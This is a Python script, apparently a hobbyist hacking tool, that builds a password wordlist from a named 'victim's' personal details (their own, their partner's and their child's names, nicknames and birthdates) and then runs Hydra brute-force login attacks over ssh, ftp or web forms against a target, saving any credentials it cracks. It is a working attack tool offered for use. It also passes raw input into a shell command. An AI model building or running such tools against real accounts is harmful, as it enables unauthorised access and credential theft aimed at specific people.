import subprocess
import itertools
import time
import random
import string
import os
import sys
# ANSI escape codes for colors
RED = '\033[91m'
ENDC = '\033[0m'
HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKCYAN = '\033[96m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

# ASCII art banners
logo_banner = RED + '''
⠄⠄⣴⣶⣤⡤⠦⣤⣀⣤⠆⠄⠄⠄⠄⠄⣈⣭⣭⣿⣶⣿⣦⣼⣆⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠉⠻⢿⣿⠿⣿⣿⣶⣦⠤⠄⡠⢾⣿⣿⡿⠋⠉⠉⠻⣿⣿⡛⣦⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠈⠄⠄⠄⠈⢿⣿⣟⠦⠄⣾⣿⣿⣷⠄⠄⠄⠄⠻⠿⢿⣿⣧⣄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣸⣿⣿⢧⠄⢻⠻⣿⣿⣷⣄⣀⠄⠢⣀⡀⠈⠙⠿⠄⠄⠄⠄
⠄⠄⢀⠄⠄⠄⠄⠄⠄⢠⣿⣿⣿⠈⠄⠄⠡⠌⣻⣿⣿⣿⣿⣿⣿⣿⣛⣳⣤⣀⣀⠄⠄
⠄⠄⢠⣧⣶⣥⡤⢄⠄⣸⣿⣿⠘⠄⠄⢀⣴⣿⣿⡿⠛⣿⣿⣧⠈⢿⠿⠟⠛⠻⠿⠄⠄
⠄⣰⣿⣿⠛⠻⣿⣿⡦⢹⣿⣷⠄⠄⠄⢊⣿⣿⡏⠄⠄⢸⣿⣿⡇⠄⢀⣠⣄⣾⠄⠄⠄
⣠⣿⠿⠛⠄⢀⣿⣿⣷⠘⢿⣿⣦⡀⠄⢸⢿⣿⣿⣄⠄⣸⣿⣿⡇⣪⣿⡿⠿⣿⣷⡄⠄
⠙⠃⠄⠄⠄⣼⣿⡟⠌⠄⠈⠻⣿⣿⣦⣌⡇⠻⣿⣿⣷⣿⣿⣿⠐⣿⣿⡇⠄⠛⠻⢷⣄
⠄⠄⠄⠄⠄⢻⣿⣿⣄⠄⠄⠄⠈⠻⣿⣿⣿⣷⣿⣿⣿⣿⣿⡟⠄⠫⢿⣿⡆⠄⠄⠄⠁
⠄⠄⠄⠄⠄⠄⠻⣿⣿⣿⣿⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⡟⢀⣀⣤⣾⡿⠃⠄⠄⠄⠄
⠄⠄⠄⠄⢰⣶⠄⠄⣶⠄⢶⣆⢀⣶⠂⣶⡶⠶⣦⡄⢰⣶⠶⢶⣦⠄⠄⣴⣶⠄⠄⠄⠄
⠄⠄⠄⠄⢸⣿⠶⠶⣿⠄⠈⢻⣿⠁⠄⣿⡇⠄⢸⣿⢸⣿⢶⣾⠏⠄⣸⣟⣹⣧⠄⠄⠄
⠄⠄⠄⠄⠸⠿⠄⠄⠿⠄⠄⠸⠿⠄⠄⠿⠷⠶⠿⠃⠸⠿⠄⠙⠷⠤⠿⠉⠉⠿⠆⠄⠄⠀
<======code by cyber-demon ======> ''' + ENDC

loading_animation = [
    RED + 'Loading   [●          ]',
    RED + 'Loading   [● ●        ]',
    RED + 'Loading   [● ● ●      ]',
    RED + 'Loading   [● ● ● ●    ]',
    RED + 'Loading   [● ● ● ● ●  ]',
    RED + 'Loading   [● ● ● ● ● ●]'
]

def generate_wordlist():
    print("Please provide information about the victim:")
    first_name = input("Enter the victim's first name: ")
    surname = input("Enter the victim's surname: ")
    nickname = input("Enter the victim's nickname: ")
    birthdate = input("Enter the victim's birthdate: ")
    
    print("\nPlease provide information about the partner:")
    partner_name = input("Enter the partner's name: ")
    partner_nickname = input("Enter the partner's nickname: ")
    partner_birthdate = input("Enter the partner's birthdate: ")
    
    print("\nPlease provide information about the child:")
    child_name = input("Enter the child's name: ")
    child_nickname = input("Enter the child's nickname: ")
    child_birthdate = input("Enter the child's birthdate: ")
    
    company_name = input("\nEnter the company name: ")
    
    keywords = input("\nDo you want to add some keywords about the victim? (Separated by spaces): ").split()
    special_chars = input("Do you want to add special characters at the end of words? (Y/N): ").lower() == 'y'
    add_numbers = input("Do you want to add random numbers at the end of words? (Y/N): ").lower() == 'y'

    wordlist = []

    # Add variations of names, birthdates, and keywords
    words_to_combine = [first_name, surname, nickname, birthdate, partner_name, partner_nickname,
                        partner_birthdate, child_name, child_nickname, child_birthdate, company_name] + keywords

    for word in words_to_combine:
        word_variations = [word.lower(), word.upper(), word.title()]
        wordlist.extend(word_variations)

        if special_chars:
            wordlist.extend([word_var + char for word_var in word_variations for char in string.punctuation])

        if add_numbers:
            wordlist.extend([word_var + ''.join(random.choices(string.digits, k=random.randint(1, 5))) for word_var in word_variations])

    return wordlist

def generate_and_save_wordlist(filename, wordlist):
    with open(filename, 'w') as file:
        file.write('\n'.join(wordlist))

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def perform_hydra_attack_own_wordlist(target, protocol):
    print("Choose an option:")
    print("1. Single username Attack")
    print("2. Multiple usernames Attack")
    user_choice = input("Enter your choice (1/2): ")

    if user_choice == '1':
        single_username = input("Enter the single username: ")
        passlist_path = input("Enter the path to the password list: ")
        hydra_command = f"hydra -l {single_username} -P {passlist_path} {target} {protocol} -V -o found_credentials.txt -u"
    elif user_choice == '2':
        usernames_path = input("Enter the path to the file containing multiple usernames: ")
        passlist_path = input("Enter the path to the password list: ")
        hydra_command = f"hydra -L {usernames_path} -P {passlist_path} {target} {protocol} -V -o found_credentials.txt -u"
    else:
        clear_terminal()
        print("Invalid choice.")
        

    clear_terminal()
    print(RED + "Starting Advanced Hydra Brute-force Attack..." + ENDC)
    
    for frame in loading_animation:
        print(frame, end='\r')
        time.sleep(0.5)
    
    print("\n")
    try:
        subprocess.run(hydra_command, shell=True, check=True)
        print(RED + "Brute-force attack completed. Check found_credentials.txt for results." + ENDC)
        print("thx for using")
        sys.exit(0)
    except subprocess.CalledProcessError as e:
        print(f"Error running Hydra: {e}")
         
# Clear the terminal when the tool starts
clear_terminal()

while True:
    print(logo_banner)
    print(WARNING + "Choose an option:" + WARNING)
    print("1. Generate wordlist only")
    print("2. Perform Hydra attack")
    print("3. Exit")
    option = input("Enter your choice (1/2/3): ")

    if option == '1':
        generated_wordlist = generate_wordlist()
        wordlist_file = "wordlist.txt"
        generate_and_save_wordlist(wordlist_file, generated_wordlist)
        print(f"Wordlist generated and saved to {wordlist_file}")
        sys.exit(0)
    elif option == '2':
        target = input("Enter the target (e.g., IP address, URL): ")
        protocol = input("Enter the protocol (e.g., ftp, ssh, http-post-form): ")
        perform_hydra_attack_own_wordlist(target, protocol)
    elif option == '0':
        # Code for option 3 remains the same as before
        pass
    elif option >= '3':
        break
    else:
        print("Invalid option selected.")
input("Press Enter to try again...")
